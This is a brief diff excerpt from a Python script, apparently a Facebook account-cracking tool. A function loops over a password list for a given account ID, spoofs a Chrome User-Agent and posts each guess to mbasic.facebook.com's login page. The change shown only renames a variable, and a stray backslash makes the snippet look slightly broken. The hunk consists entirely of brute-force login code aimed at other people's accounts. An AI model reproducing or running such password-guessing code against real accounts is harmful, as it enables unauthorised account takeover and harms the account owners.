@@ -1226,7 +1226,7 @@ def m6(idf,pwv):
   for ps in pwv:
    session = requests.session()  
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'}) \
-   r = session.get('https://mbasic.facebook.com')
+   free = session.get('https://mbasic.facebook.com')
    r_login = session.post('https://mbasic.facebook.com/login.php',
                        data={'email': idf,
                              'pass': ps
